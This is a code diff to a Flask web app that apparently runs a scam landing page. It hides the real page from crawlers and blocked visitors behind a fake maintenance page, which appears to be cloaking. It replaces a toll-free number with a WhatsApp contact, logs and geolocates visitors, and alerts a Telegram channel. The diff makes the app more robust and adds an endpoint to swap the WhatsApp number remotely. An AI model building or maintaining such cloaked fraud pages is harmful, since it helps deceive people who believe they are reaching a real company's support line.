@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, send_from_directory, jsonify
+from flask import Flask, request, redirect, send_from_directory, jsonify, make_response
 import json
 import os
 import requests
@@ -12,7 +12,8 @@ import random
 
 app = Flask(__name__, static_folder='.', static_url_path='')
 
-DB_FILE = 'database.json'
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_FILE = os.path.join(BASE_DIR, 'database.json')
 db_lock = threading.Lock()
 
 def get_secrets():
@@ -21,10 +22,10 @@ def get_secrets():
     if token and channel_id:
         return {'token': token, 'channel_id': channel_id}
     try:
-        with open('secret.key', 'rb') as f:
+        with open(os.path.join(BASE_DIR, 'secret.key'), 'rb') as f:
             key = f.read()
         fernet = Fernet(key)
-        with open('secrets.enc', 'rb') as f:
+        with open(os.path.join(BASE_DIR, 'secrets.enc'), 'rb') as f:
             enc_data = f.read()
         return json.loads(fernet.decrypt(enc_data).decode('utf-8'))
     except Exception as e:
@@ -107,17 +108,24 @@ def notify_telegram(log_entry):
             pass
 
 def load_db():
+    import time
     if os.path.exists(DB_FILE):
-        try:
-            with open(DB_FILE, 'r', encoding='utf-8') as f:
-                return json.load(f)
-        except:
-            pass
+        for _ in range(5):
+            try:
+                with open(DB_FILE, 'r', encoding='utf-8') as f:
+                    return json.load(f)
+            except:
+                time.sleep(0.1)
     return {"whatsapp_number": "5511999999999", "logs": [], "sessions": {}}
 
 def save_db(data):
-    with open(DB_FILE, 'w', encoding='utf-8') as f:
-        json.dump(data, f, ensure_ascii=False, indent=4)
+    tmp_file = DB_FILE + '.tmp'
+    try:
+        with open(tmp_file, 'w', encoding='utf-8') as f:
+            json.dump(data, f, ensure_ascii=False, indent=4)
+        os.replace(tmp_file, DB_FILE)
+    except:
+        pass
 
 def get_geo_info(ip):
     if ip == '127.0.0.1':
@@ -208,19 +216,19 @@ def index():
     
     if not is_crawler:
         if is_blocked(ip, ua):
-            with open('maintenance.html', 'r', encoding='utf-8') as f:
+            with open(os.path.join(BASE_DIR, 'maintenance.html'), 'r', encoding='utf-8') as f:
                 return f.read()
                 
         sec_cookie = request.cookies.get('coca_sec_session')
         if not sec_cookie:
-            with open('maintenance.html', 'r', encoding='utf-8') as f:
+            with open(os.path.join(BASE_DIR, 'maintenance.html'), 'r', encoding='utf-8') as f:
                 return f.read()
                 
         log_event("ENTRADA")
         
     db = load_db()
     wa_num = db.get("whatsapp_number", "0800-887-1111")
-    with open('index.html', 'r', encoding='utf-8') as f:
+    with open(os.path.join(BASE_DIR, 'index.html'), 'r', encoding='utf-8') as f:
         html = f.read()
     html = html.replace("0800-887-1111", wa_num)
     
@@ -233,6 +241,20 @@ def index():
     
     js_patch = """
     <script>
+    document.addEventListener('gesturestart', function (e) {
+        e.preventDefault();
+    });
+    document.addEventListener('touchmove', function(e) {
+        if (e.scale !== 1) { e.preventDefault(); }
+    }, { passive: false });
+    var meta = document.createElement('meta');
+    meta.name = 'viewport';
+    meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+    document.head.appendChild(meta);
+    var style = document.createElement('style');
+    style.innerHTML = 'body { touch-action: manipulation; }';
+    document.head.appendChild(style);
+
     document.addEventListener('click', function(e) { 
         var target = e.target;
         var a = target.closest('a'); 
@@ -257,7 +279,7 @@ def index():
             } else if (text.includes('como funciona') || text.includes('dúvida')) {
                 action = 'ajuda';
             }
-            window.location.href = '/redirect_whatsapp?action=' + encodeURIComponent(action); 
+            window.location.href = '/redirect_whatsapp?action=' + encodeURIComponent(action) + '&t=' + new Date().getTime(); 
         } 
     }, true);
     </script>
@@ -267,7 +289,12 @@ def index():
         html = html.replace("</body>", js_patch + "</body>")
     else:
         html += js_patch
-    return html
+    
+    resp = make_response(html)
+    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
+    resp.headers["Pragma"] = "no-cache"
+    resp.headers["Expires"] = "0"
+    return resp
 
 def get_greeting():
     tz = pytz.timezone('America/Sao_Paulo')
@@ -336,7 +363,7 @@ def redirect_whatsapp():
     
     if not is_crawler:
         if is_blocked(ip, ua):
-            with open('maintenance.html', 'r', encoding='utf-8') as f:
+            with open(os.path.join(BASE_DIR, 'maintenance.html'), 'r', encoding='utf-8') as f:
                 return f.read()
                 
     action = request.args.get('action', 'geral')
@@ -376,24 +403,10 @@ def redirect_whatsapp():
             var phone = "{wa_num}";
             var text = "{encoded_text}";
             
-            var ua = navigator.userAgent || navigator.vendor || window.opera;
-            var isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
-            var isAndroid = /android/i.test(ua);
-            
             var apiLink = "https://api.whatsapp.com/send?phone=" + phone + "&text=" + text;
-            var intentLink = "intent://send?phone=" + phone + "&text=" + text + "#Intent;scheme=whatsapp;package=com.whatsapp;end";
-            var deepLink = "whatsapp://send?phone=" + phone + "&text=" + text;
-            
-            var finalLink = apiLink; // Desktop and Web fallback
-            
-            if (isAndroid) {{
-                finalLink = intentLink;
-            }} else if (isIOS) {{
-                finalLink = deepLink;
-            }}
+            var finalLink = apiLink;
 
             document.getElementById("wa-btn").href = finalLink;
-            
             // Try to open native app automatically
             setTimeout(function() {{
                 window.location.href = finalLink;
@@ -402,7 +415,30 @@ def redirect_whatsapp():
     </body>
     </html>
     """
-    return html_redirect
+    resp = make_response(html_redirect)
+    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
+    resp.headers["Pragma"] = "no-cache"
+    resp.headers["Expires"] = "0"
+    return resp
+
+@app.route('/api/update_number', methods=['POST'])
+def update_number():
+    data = request.json
+    if not data or 'number' not in data or 'token' not in data:
+        return jsonify({"error": "Invalid payload"}), 400
+        
+    secrets = get_secrets()
+    valid_token = secrets.get('token') if secrets else None
+    
+    if not valid_token or data['token'] != valid_token:
+        return jsonify({"error": "Unauthorized"}), 403
+        
+    with db_lock:
+        db = load_db()
+        db['whatsapp_number'] = data['number']
+        save_db(db)
+        
+    return jsonify({"success": True})
 
 @app.route('/api/stats')
 def get_stats():
